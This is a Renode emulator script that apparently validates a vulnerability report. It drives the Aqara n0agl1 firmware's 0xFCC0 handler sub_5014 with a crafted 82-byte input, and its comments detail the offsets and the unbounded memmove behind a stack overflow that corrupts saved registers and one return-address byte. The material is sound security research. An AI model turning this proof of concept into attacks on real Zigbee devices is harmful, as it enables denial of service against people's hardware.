:name: ZB-04 Aqara n0agl1 sub_5014 0xFCC0 constrained overflow — validation (Series 1 / MG13)
:description: Drives the 0xFCC0 Aqara mfg-specific handler sub_5014 of the real Aqara n0agl1 firmware on an emulated EFR32MG13 (Cortex-M4, Series 1) and demonstrates the constrained stack overflow: an unbounded memmove of (bufLen-5) bytes into a 64-byte buffer fully overwrites saved R4/R5/R6 and corrupts one byte of the saved return address. Bounded by the 82-byte reception cap = constrained CFH/DoS (not full PC control), exactly as the report claims.
#
# RESULT (read at PC=0x5042, after memmove, before epilogue):
#   0x2000EFB0 (buffer)   = 0xAAAAAAAA   payload written
#   0x2000EFF0 (saved R4) = 0xAAAAAAAA   fully overwritten
#   0x2000EFF4 (saved R5) = 0xAAAAAAAA   fully overwritten
#   0x2000EFF8 (saved R6) = 0xAAAAAAAA   fully overwritten
#   0x2000EFFC (saved LR) = 0xDEADBEAA   low byte 0xEF->0xAA (constrained)
#
# Bug (sub_5014 @0x5014): memmove is the FIRST op. count=(uint16)(bufLen-5),
# dest=SP+0x10 (64B buffer), src=struct[0x8]+5. No clamp (BL sub_C5F0 @0x502a).
# Prologue push{r4,r5,r6,lr}+sub sp,#0x50: saved R4/R5/R6 at buf[64/68/72],
# saved LR at buf[76]. bufLen cap 82 -> count 77 -> writes buf[0..76], reaching
# the saved-LR low byte only. Epilogue 0x5066 `pop {r4,r5,r6,pc}`.
#
# NOTE: MG13 MappedMemory writes bypass Renode watchpoint hooks, so we OBSERVE by
# reading memory at PC=0x5042 (step 300 lands there: after the memmove returns,
# before the epilogue reuses the frame).

using sysbus
emulation SetGlobalSerialExecution true
mach create "zb04"
machine LoadPlatformDescription @platforms/boards/silabs/brd4162a.repl
macro reset
"""
    sysbus LoadELF @scripts/silabs-vuln/zb04_aqara.elf
    cpu VectorTableOffset 0x4000
"""
runMacro $reset
logLevel 3

emulation RunFor "0.3"
pause

# --- Crafted EmberAfClusterCommand-like struct @0x2000A000 ---
#   [0x08]=source base ptr (0x2000B000)  [0x0C]=bufLen 0x0052 (82)  [0x14]=payloadStartIndex 5
sysbus WriteDoubleWord 0x2000A000 0x2000B000
sysbus WriteDoubleWord 0x2000A008 0x2000B000
sysbus WriteDoubleWord 0x2000A00C 0x00000052
sysbus WriteByte 0x2000A014 0x05

# --- Source buffer: memmove reads 77 bytes from 0x2000B005. Fill 0xAA sentinel.
sysbus WriteDoubleWord 0x2000B000 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B004 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B008 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B00C 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B010 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B014 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B018 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B01C 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B020 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B024 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B028 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B02C 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B030 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B034 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B038 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B03C 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B040 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B044 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B048 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B04C 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B050 0xAAAAAAAA
sysbus WriteDoubleWord 0x2000B054 0xAAAAAAAA

# --- Call frame: SP0=0x2000F000, r0=struct, LR=0xDEADBEEF sentinel, PC=sub_5014 ---
sysbus.cpu SetRegister 13 0x2000F000
sysbus.cpu SetRegister 14 0xDEADBEEF
sysbus.cpu SetRegister 0  0x2000A000
sysbus.cpu PC 0x5014

echo ">>> BEFORE: saved R4/R5/R6/LR slots (0x2000EFF0/F4/F8/FC) ="
sysbus ReadDoubleWord 0x2000EFF0
sysbus ReadDoubleWord 0x2000EFF4
sysbus ReadDoubleWord 0x2000EFF8
sysbus ReadDoubleWord 0x2000EFFC

# Step to PC=0x5042 (just after the memmove returns, before the epilogue).
sysbus.cpu Step 300

echo ">>> AFTER: buffer start @0x2000EFB0 (expect 0xAAAAAAAA) ="
sysbus ReadDoubleWord 0x2000EFB0
echo ">>> saved R4 @0x2000EFF0 (expect 0xAAAAAAAA) ="
sysbus ReadDoubleWord 0x2000EFF0
echo ">>> saved R5 @0x2000EFF4 (expect 0xAAAAAAAA) ="
sysbus ReadDoubleWord 0x2000EFF4
echo ">>> saved R6 @0x2000EFF8 (expect 0xAAAAAAAA) ="
sysbus ReadDoubleWord 0x2000EFF8
echo ">>> saved LR @0x2000EFFC (expect 0xDEADBEAA - one byte corrupted) ="
sysbus ReadDoubleWord 0x2000EFFC
